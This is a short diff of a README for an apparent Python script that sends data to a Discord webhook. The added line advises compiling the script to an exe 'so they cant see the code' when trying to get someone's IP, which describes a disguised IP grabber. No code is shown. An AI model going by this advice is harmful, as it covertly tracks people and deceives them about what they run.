@@ -4,7 +4,8 @@
 
 # Usage
  put your webbhook link in line 12 
-
+ 
+ if you are trying to get someones ip convert this to a exe so they cant see the code
 # Requirements
  - pip install requests
  - pip install discord_webhook
